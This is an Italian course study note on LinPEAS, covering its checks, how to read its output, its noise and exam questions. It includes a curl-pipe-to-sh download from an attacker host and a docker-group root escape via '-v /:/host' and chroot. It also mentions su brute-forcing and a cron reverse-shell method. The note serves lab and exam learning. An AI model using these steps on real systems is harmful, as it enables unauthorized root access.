# LinPEAS

> [!abstract] In una frase LinPEAS (**Lin**ux **P**rivilege **E**scalation **A**wesome **S**cript) è uno script bash standalone che automatizza il recon di privilege escalation su Unix: esegue centinaia di check (SUID, cron, capabilities, gruppi pericolosi, credenziali in chiaro, kernel, ecc.) e li classifica per probabilità con un sistema di colori. Approfondisce [[ETHL 0x06 — Hacking Unix p2]] §3.

> [!tip] Come usare questa nota LinPEAS **non introduce tecniche nuove** — è un motore di ricerca per le tecniche già viste in [[ETHL 0x05 — Hacking Unix p1]] e [[ETHL 0x06 — Hacking Unix p2]]. Il valore aggiunto di questa nota non è "cos'è LinPEAS" (già nella nota 0x06), ma **come si legge l'output** e **come si collega a ciò che già sai**. Per il confronto con LES vedi [[ETHL 0x06 — Hacking Unix p2#4. Linux Exploit Suggester (LES)]].

---

## 1. Cos'è e come funziona

LinPEAS è un singolo file bash (`linpeas.sh`), **senza dipendenze esterne** — gira su qualunque sistema con una shell POSIX, anche le distro più minimali. Internamente è una lunghissima sequenza di comandi standard (`find`, `grep`, `ls`, `cat`, `getcap`, …) già automatizzati: non fa nulla che tu non potresti fare a mano, semplicemente lo fa **tutto, in ordine, e ti evidenzia cosa guardare**.

Cosa enumera, in sintesi:

- info di sistema (kernel, distro, variabili d'ambiente, PATH)
- utenti, gruppi, permessi sudo (`sudo -l`)
- processi in esecuzione e relativi binari
- SUID/SGID, capabilities (`getcap -r /`)
- cronjob (`/etc/crontab`, `/etc/cron.d/`, crontab utente)
- file scrivibili in posizioni sensibili (PATH, systemd unit, script avviati da root)
- credenziali "a vista": history, config, chiavi SSH, file con `password` nel nome/contenuto
- mount, share NFS, container/gruppi speciali (docker, lxd, disk, adm)

> [!info] Punto chiave LinPEAS è un **aggregatore di checklist**, non un exploit. Trova _dove guardare_; l'exploit (Method 1/2/3 dei cron, wildcard injection, SUID PATH, `/etc/ld.so.preload` come in [[Dynamic Linking]]…) lo applichi tu con le tecniche già studiate.

---

## 2. Trasferimento sul target

Nella maggior parte dei lab/CTF il target non ha accesso diretto a internet per scaricare il file, quindi si serve dalla macchina attaccante:

```bash
# Lato attaccante: nella cartella dove sta linpeas.sh
python3 -m http.server 8000

# Lato target
curl http://<ip-attaccante>:8000/linpeas.sh | sh
# oppure
wget http://<ip-attaccante>:8000/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
```

> [!warning] OPSEC Scrivere `linpeas.sh` su disco (`/tmp/`) lascia un artefatto. La pipe `curl | sh` evita di toccare il filesystem con il file, ma **l'output dello script stesso** può comunque generare rumore (vedi §8). In ambienti reali, valutare se serve davvero o se basta il recon manuale già fatto.

---

## 3. Esecuzione: standard vs `-a`

```bash
./linpeas.sh         # scansione standard
./linpeas.sh -a      # extra checks orientati al CTF
```

La modalità `-a` (_aggressive/all checks_) aggiunge controlli pensati per ambienti CTF, non per engagement reali:

- ricerca più estesa di **hash** dentro file di sistema (non solo `/etc/shadow`)
- **brute-force** automatico: per ogni utente locale, prova `su <user>` con una wordlist delle ~2000 password più comuni

> [!danger] Perché `-a` è "solo CTF" Il brute-force con `su` genera **un tentativo di login fallito per ogni password della wordlist, per ogni utente** → centinaia/migliaia di eventi nei log di autenticazione in pochi secondi. In un ambiente monitorato è un campanello d'allarme enorme. Nei CTF va bene perché spesso le macchine hanno password debole "messa apposta" e nessuno controlla i log.

---

## 4. Legenda colori e ordine di lettura

|Colore|Significato|
|---|---|
|**Rosso/Giallo**|~95% un vettore di PE concreto|
|**Rosso**|da guardare con attenzione (non sempre exploitable, ma sospetto)|
|Verde|informazioni "normali" — utenti, gruppi, SUID comuni, mount, cronjob standard|
|LightMagenta|il tuo username corrente (per orientarsi nell'output)|

L'output può essere lunghissimo (migliaia di righe). Non si legge dall'inizio alla fine: si va **a sezioni**, in un ordine di priorità tipico:

1. **`sudo -l`** — se l'utente può eseguire qualcosa come root senza password, è quasi sempre il vettore più rapido (spesso GTFOBins).
2. **SUID/SGID binari non standard** — qualsiasi binario SUID che non sia nella lista "nota" del sistema.
3. **Capabilities** (`getcap -r /`) — es. `cap_setuid+ep` su un binario equivale quasi a SUID.
4. **Gruppi pericolosi** — `docker`, `lxd`, `disk`, `adm`, `shadow` (vedi §6).
5. **Cronjob** — script world-writable, PATH insicuro, wildcard (i 3 Method di [[ETHL 0x06 — Hacking Unix p2]]).
6. **File interessanti / credenziali** — config, history, chiavi (vedi [[ETHL 0x06 — Hacking Unix p2#2. Passwords and keys]]).
7. **Kernel version** — se nulla sopra ha funzionato, si passa a LES per i kernel exploit.

> [!tip] Mnemonica "**S**udo, **S**uid, **C**ap, **G**roup, **C**ron, **C**reds, **K**ernel" — dal più rapido/silenzioso al più rumoroso/rischioso. È lo stesso ordine logico di "prima le misconfig, poi i kernel exploit" già visto per LinPEAS vs LES.

---

## 5. Collegamento ai vettori già studiati

LinPEAS non è un argomento isolato: è lo strumento che **trova automaticamente** quasi tutto ciò che hai già imparato a fare a mano.

|Vettore già visto|Dove/come lo segnala LinPEAS|
|---|---|
|Cron script world-writable (Method 1, [[ETHL 0x06 — Hacking Unix p2]])|Sezione cron, riga del file evidenziata in rosso/giallo perché scrivibile dall'utente corrente|
|Cron PATH insicuro (Method 2)|Sezione "PATH" + sezione cron mostrano il PATH usato dal cronjob; se una directory del PATH è scrivibile, viene segnalata|
|Cron wildcard injection (Method 3)|Mostra il contenuto dello script cron; la wildcard `*` in un comando come `tar`/`chown`/`rsync` è un pattern che un occhio allenato riconosce anche se LinPEAS non lo "spiega"|
|SUID con PATH relativo ([[ETHL 0x05 — Hacking Unix p1]])|Sezione SUID/SGID, binario evidenziato; va poi controllato a mano se chiama comandi con path relativo|
|`/etc/ld.so.preload` scrivibile ([[Dynamic Linking]])|Sezione "interesting files"/permessi su `/etc/`, file world-writable evidenziato|
|Password in `.bash_history` / config|Sezione dedicata, grep automatico su keyword come `pass`, `pwd`, `key`|

> [!info] Perché questa tabella conta All'esame, una domanda plausibile è: _"LinPEAS evidenzia X in rosso, spiega perché e come lo sfrutti"_ — la risposta corretta richiede di **ricondurre l'output al meccanismo sottostante** (es. wildcard injection), non solo dire "è rosso quindi è un vettore".

---

## 6. Caso studio: il gruppo `docker`

> [!example] Scenario LinPEAS, nella sezione gruppi, mostra che l'utente corrente appartiene a `docker` (spesso evidenziato perché è un gruppo "pericoloso" noto).

```bash
# 1. Verifica
id
# uid=1000(user) gid=1000(user) groups=1000(user),999(docker)

# 2. Container con tutto il filesystem host montato
docker run -it -v /:/host/ bash:latest bash

# 3. Dentro il container, chroot nella root dell'host
chroot /host bash

# 4. Verifica privilegi
id
# uid=0(root) gid=0(root)
```

> [!danger] Perché funziona — Confused Deputy L'utente **non è root**, ma il **Docker daemon gira come root**. Quando l'utente esegue `docker run`, sta chiedendo al daemon (root) di fare qualcosa per suo conto. Montare `/` dell'host dentro il container e poi fare `chroot` su quel mount **non richiede privilegi nel container stesso** — è il daemon, con i suoi privilegi di root, che esegue il mount. Risultato: l'utente ottiene una shell con `uid=0` sul filesystem dell'host.
> 
> Questo è lo **stesso pattern del Confused Deputy** del cron-root ([[ETHL 0x06 — Hacking Unix p2]]) e del SetUID/dynamic linker ([[Dynamic Linking]]): un componente con più privilegi di te esegue un'azione per tuo conto, e tu controlli l'input di quell'azione.

> [!success] Difesa Il gruppo `docker` (così come `lxd`) **equivale a root**: nessun controllo di accesso aggiuntivo lo limita. Non va assegnato a utenti non completamente fidati, allo stesso modo in cui non si darebbe `sudo ALL=(ALL) NOPASSWD: ALL`.

---

## 7. Falsi positivi e verifica manuale

> [!warning] Rosso ≠ exploit garantito LinPEAS segnala in rosso/giallo **tutto ciò che statisticamente è spesso un vettore**, ma il contesto specifico può renderlo inutilizzabile:
> 
> - un binario SUID "sospetto" potrebbe essere già patchato o non avere una versione vulnerabile
> - un file cron "scrivibile" potrebbe non essere mai eseguito (cronjob disabilitato, commentato)
> - una capability potrebbe essere su un binario che non fa nulla di utile con quella capability
> 
> La regola pratica: LinPEAS **restringe lo spazio di ricerca**, ma la conferma ("questo è davvero exploitable, e così si fa") richiede sempre il ragionamento manuale — gli stessi 3 Method del cron, GTFOBins, ecc.

---

## 8. Limiti operativi — perché è rumoroso

LinPEAS è ottimo in CTF/lab, rischioso in un engagement reale stealth, per motivi concreti:

- **Volume di comandi**: esegue centinaia di `find`, `grep -r`, letture di file di sistema in pochi secondi → pattern anomalo per qualsiasi EDR.
- **Signature note**: il contenuto stesso dello script (stringhe, nomi di funzioni) è nelle signature di molti antivirus/EDR.
- **`find / ...` ricorsivo**: genera moltissime System call di accesso a file, spesso anche su directory protette → log di audit (es. `auditd`) pieni di eventi.
- **`-a` con brute-force `su`**: vedi §3, genera log di autenticazione falliti in massa.

> [!info] Alternativa "silenziosa" In contesti stealth, il recon si fa **a mano e mirato**: `sudo -l`, `find / -perm -4000 2>/dev/null`, `getcap -r / 2>/dev/null`, lettura di `/etc/crontab` e `~/.bash_history`. Più lento, ma genera un'impronta minima — è essenzialmente eseguire "a mano" un sottoinsieme dei check che LinPEAS automatizza.

---

## 9. LinPEAS vs LES — promemoria

| |LinPEAS|LES (Linux Exploit Suggester)|
|---|---|---|
|Cosa cerca|**Misconfigurazioni** (permessi, gruppi, cron, SUID, credenziali)|**Vulnerabilità del kernel** mappate a CVE pubblici|
|Output|Centinaia di righe colorate, ampio spettro|Lista di CVE con probabilità (Highly probable / Probable / …)|
|Rischio operativo|Rumoroso ma raramente destabilizza il sistema|Un kernel exploit reale può **crashare la macchina**|
|Ordine d'uso|**Prima**|**Dopo**, solo se le misconfig non bastano|

Approfondimento completo in [[ETHL 0x06 — Hacking Unix p2#4. Linux Exploit Suggester (LES)]].

---

## 10. Tabella riassuntiva

|Aspetto|Punto chiave|
|---|---|
|Cos'è|Script bash standalone, no dipendenze, automatizza recon di PE|
|Esecuzione|`./linpeas.sh` (standard) / `./linpeas.sh -a` (CTF, hash extra + brute-force su)|
|Trasferimento|`python3 -m http.server` + `curl/wget` sul target|
|Colori|Rosso/Giallo = vettore probabile; Verde = normale; LightMagenta = tuo user|
|Ordine di lettura|sudo -l → SUID/SGID → capabilities → gruppi pericolosi → cron → credenziali → kernel|
|Caso esame|Gruppo `docker` → `docker run -v /:/host` + `chroot` → root (Confused Deputy)|
|Falsi positivi|Rosso = "guarda qui", non "exploit garantito" — serve verifica manuale|
|Rumore|Molti comandi in poco tempo + signature note → rilevabile da EDR; `-a` genera log di auth falliti|
|Relazione con LES|LinPEAS = misconfig (prima, silenzioso); LES = kernel CVE (dopo, rischioso)|

---

## 11. Trappole d'esame

> [!danger] Domande tipiche
> 
> 1. **Cos'è LinPEAS e perché "no dependencies" è importante?** → è un singolo script bash, gira su qualsiasi sistema Unix senza installare nulla.
> 2. **Differenza tra `./linpeas.sh` e `./linpeas.sh -a`?** → `-a` aggiunge ricerca estesa di hash e brute-force `su` con wordlist comune, pensato per CTF.
> 3. **Cosa significa "rosso/giallo" nell'output?** → ~95% un vettore di PE, ma va verificato manualmente.
> 4. **Perché il gruppo `docker` è un vettore di PE?** → il Docker daemon gira come root; montare `/` host in un container e fare `chroot` dà una shell root sull'host, senza che l'utente avesse privilegi diretti (Confused Deputy).
> 5. **Perché LinPEAS è rischioso in un engagement reale?** → genera un volume anomalo di system call/log in poco tempo ed è nelle signature di molti EDR/AV.
> 6. **LinPEAS vs LES — quale si usa prima e perché?** → LinPEAS prima (misconfig, più silenzioso e affidabile), LES dopo (kernel exploit, rischio di crash).
> 7. **LinPEAS trova un cron script world-writable: cosa fai dopo?** → applichi il Method 1 di [[ETHL 0x06 — Hacking Unix p2]] (riscrittura con reverse shell) — LinPEAS individua, tu sfrutti.

---

## 12. Richiamo attivo (a libro chiuso)

> [!question] Verifica
> 
> 1. Spiega in una frase cosa fa LinPEAS e perché non è "un exploit" di per sé.
> 2. Come trasferisci `linpeas.sh` su un target senza accesso diretto a internet?
> 3. Qual è la differenza pratica (e il rischio) della modalità `-a`?
> 4. Elenca, in ordine di priorità, le prime 4 cose da controllare nell'output di LinPEAS e perché in quell'ordine.
> 5. LinPEAS evidenzia in rosso il gruppo `docker`: descrivi passo passo come arrivi a root sull'host.
> 6. Cosa intendiamo con "Confused Deputy" e in quali altri due casi (visti in note precedenti) si applica lo stesso schema?
> 7. Perché un risultato "rosso" di LinPEAS potrebbe NON essere sfruttabile? Dai un esempio.
> 8. Quali 2 caratteristiche di LinPEAS lo rendono rilevabile da un EDR?
> 9. In che ordine si usano LinPEAS e LES, e perché in quell'ordine e non il contrario?
> 10. Per ciascuno dei 3 Method di cron exploitation ([[ETHL 0x06 — Hacking Unix p2]]), in quale sezione dell'output di LinPEAS lo individueresti?

---

> [!quote] Filo conduttore LinPEAS non aggiunge tecniche: **organizza e velocizza la ricerca** di tutto ciò che hai già studiato — Confused Deputy (cron root, docker daemon, dynamic linker), misconfigurazioni di permessi, e credenziali lasciate in chiaro. Il valore per l'esame non è ripetere "cos'è LinPEAS", ma dimostrare di saper **ricondurre un'evidenza colorata nell'output al meccanismo exploit sottostante**.